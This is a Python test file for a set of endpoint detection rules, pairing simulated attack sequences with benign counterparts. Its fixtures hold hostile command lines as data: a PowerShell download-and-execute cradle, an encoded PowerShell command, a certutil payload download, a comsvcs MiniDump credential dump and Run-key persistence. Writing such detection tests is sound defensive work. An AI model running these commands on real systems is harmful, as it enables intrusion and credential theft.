"""Starter pack scenarios (each rule positive + a benign counterpart)."""
from factory import Harness, actor, canon_process, rec


def _ids(h):
    return sorted({d["rule_id"] for d in h.detections()})


def test_pack_loads_eight_active_rules():
    h = Harness()
    assert [r.rule_id for r in h.registry.live_rules()] == [f"E3-SEQ-00{i}" for i in range(1, 9)]
    assert all(r.mitre for r in h.registry.live_rules())


def test_001_office_spawns_interpreter_with_cmdline_bonus():
    h = Harness()
    h.feed(rec(canon_process("WINWORD.EXE", guid="W"), "r1"),
           rec(canon_process("powershell.exe", guid="P", parent_guid="W", t=2,
                             cmd="powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://x')"), "r2"))
    [d] = [d for d in h.detections() if d["rule_id"] == "E3-SEQ-001"]
    assert d["confidence"] == 75 and {m["technique_id"] for m in d["mitre"]} == {"T1566.001", "T1059"}


def test_002_encoded_powershell_dns_then_external_connection():
    h = Harness()
    h.feed(rec(canon_process("powershell.exe", guid="P", cmd="powershell.exe -enc SQBFAFgA"), "r1"),
           rec(actor("P", "DNS", 2, query_name="evil.example", answers=["198.51.100.9"]), "r2"),
           rec(actor("P", "NETWORK", 3, dest_ip="198.51.100.9", dest_port="443", direction="OUTBOUND"), "r3"))
    [d] = [d for d in h.detections() if d["rule_id"] == "E3-SEQ-002"]
    assert [s["stage_id"] for s in d["matched_stages"]] == ["ps", "dns", "net"]
    assert d["confidence"] == 65  # optional DNS stage bonus


def test_002_internal_destination_is_not_detected():
    h = Harness()
    h.feed(rec(canon_process("powershell.exe", guid="P", cmd="powershell.exe -enc SQBFAFgA"), "r1"),
           rec(actor("P", "NETWORK", 3, dest_ip="10.1.2.3", dest_port="445"), "r3"))
    assert "E3-SEQ-002" not in _ids(h)


def test_003_credential_access():
    h = Harness()
    h.feed(rec(canon_process("cmd.exe", guid="C"), "r1"),
           rec(canon_process("rundll32.exe", guid="R", parent_guid="C", t=4,
                             cmd="rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full"), "r2"))
    assert "E3-SEQ-003" in _ids(h)


def test_004_lolbin_external_and_update_exclusion():
    h = Harness()
    h.feed(rec(canon_process("certutil.exe", guid="L", cmd="certutil -urlcache -f http://x/a.exe a.exe"), "r1"),
           rec(actor("L", "NETWORK", 1, dest_ip="203.0.113.5", dest_port="80"), "r2"))
    assert [d["status"] for d in h.detections() if d["rule_id"] == "E3-SEQ-004"] == ["OPEN"]
    h2 = Harness()
    h2.feed(rec(canon_process("msiexec.exe", guid="M"), "r1"),
            rec(actor("M", "NETWORK", 1, dest_ip="13.107.4.50", dest_hostname="dl.delivery.windowsupdate.com"), "r2"))
    [d] = [d for d in h2.detections() if d["rule_id"] == "E3-SEQ-004"]
    assert d["status"] == "SUPPRESSED" and d["evidence_refs"]


def test_005_registry_persistence():
    h = Harness()
    h.feed(rec(canon_process("powershell.exe", guid="P"), "r1"),
           rec(actor("P", "REGISTRY", 5, key="HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd",
                     operation="SET_VALUE"), "r2"))
    assert "E3-SEQ-005" in _ids(h)


def test_006_and_007_write_then_execute():
    path = "C:\\Users\\a\\AppData\\Local\\Temp\\p.exe"
    h = Harness()
    h.feed(rec(canon_process("powershell.exe", guid="P"), "r1"),
           rec(actor("P", "FILE", 3, path=path, operation="CREATE"), "r2"),
           rec(canon_process("p.exe", guid="X", parent_guid="E", path=path, t=9), "r3"))
    assert {"E3-SEQ-006", "E3-SEQ-007"} <= set(_ids(h))


def test_006_written_but_never_executed_is_partial_non_match():
    h = Harness()
    h.feed(rec(actor("P", "FILE", 3, path="C:\\t\\p.exe", operation="CREATE"), "r2"),
           rec(canon_process("other.exe", guid="X", path="C:\\t\\other.exe", t=9), "r3"))
    assert "E3-SEQ-006" not in _ids(h)


def test_008_webserver_shell_recon():
    h = Harness()
    h.feed(rec(canon_process("w3wp.exe", guid="S"), "r1"),
           rec(canon_process("cmd.exe", guid="C", parent_guid="S", t=2, cmd="cmd.exe /c whoami /all"), "r2"))
    assert "E3-SEQ-008" in _ids(h)
